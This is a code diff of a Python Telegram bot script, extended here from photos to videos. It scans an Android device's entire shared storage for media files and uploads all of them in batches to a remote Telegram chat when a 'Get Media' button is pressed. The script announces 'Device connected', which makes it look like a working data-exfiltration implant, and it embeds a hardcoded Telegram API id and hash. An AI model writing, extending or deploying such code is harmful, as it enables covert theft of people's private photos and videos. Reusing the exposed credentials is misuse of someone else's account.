@@ -12,17 +12,18 @@ with open(CONFIG_PATH, "r") as f:
 BOT_TOKEN = config["BOT_TOKEN"]
 CHAT_ID = config["CHAT_ID"]
 
-# Image extensions
-IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")
+# Image and video extensions
+MEDIA_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp",
+              ".mp4", ".mov", ".mkv", ".avi", ".webm")
 
 # ================= FUNCTIONS =================
-def list_all_photos():
-    """Scan entire accessible storage for images."""
+def list_all_media():
+    """Scan entire accessible storage for images and videos."""
     files = []
     storage_root = "/storage/emulated/0"
     for root, dirs, filenames in os.walk(storage_root):
         for fn in filenames:
-            if fn.lower().endswith(IMAGE_EXTS):
+            if fn.lower().endswith(MEDIA_EXTS):
                 path = os.path.join(root, fn)
                 try:
                     mtime = os.path.getmtime(path)
@@ -32,13 +33,13 @@ def list_all_photos():
     files.sort(reverse=True)
     return [p for _, p in files]
 
-async def send_gallery(client, batch_size=20):
-    files = list_all_photos()
+async def send_media(client, batch_size=10):
+    files = list_all_media()
     if not files:
-        await client.send_message(CHAT_ID, "No photos found in storage.")
+        await client.send_message(CHAT_ID, "No media found in storage.")
         return
 
-    await client.send_message(CHAT_ID, f"Sending {len(files)} photos in batches of {batch_size}...")
+    await client.send_message(CHAT_ID, f"Sending {len(files)} media files in batches of {batch_size}...")
 
     # Send in batches
     for i in range(0, len(files), batch_size):
@@ -53,13 +54,12 @@ async def send_gallery(client, batch_size=20):
         if media:
             try:
                 await client.send_file(CHAT_ID, media)
-                await asyncio.sleep(1)  # Small delay between batches
+                await asyncio.sleep(2)  # Small delay between batches
             except Exception as e:
                 print(f"Failed to send batch starting with {batch[0]}: {e}")
 
 # ================= MAIN =================
 async def main():
-    # Your API credentials
     api_id = 22071176
     api_hash = '7ed5401b625a0a4d3c45caf12c87f166'
 
@@ -70,18 +70,18 @@ async def main():
     await client.send_message(
         CHAT_ID,
         "Device connected ✅",
-        buttons=[Button.inline("Get Gallery", b"get_gallery")]
+        buttons=[Button.inline("Get Media", b"get_media")]
     )
 
     @client.on(events.CallbackQuery)
     async def callback(event):
         if event.sender_id != CHAT_ID:
             return
-        if event.data == b"get_gallery":
-            await event.answer("Sending all photos in batches...")
-            await send_gallery(client)
+        if event.data == b"get_media":
+            await event.answer("Sending all images and videos in batches...")
+            await send_media(client)
 
-    print("now you can use.")
+    print("Bot is running...")
     await client.run_until_disconnected()
 
 if __name__ == "__main__":
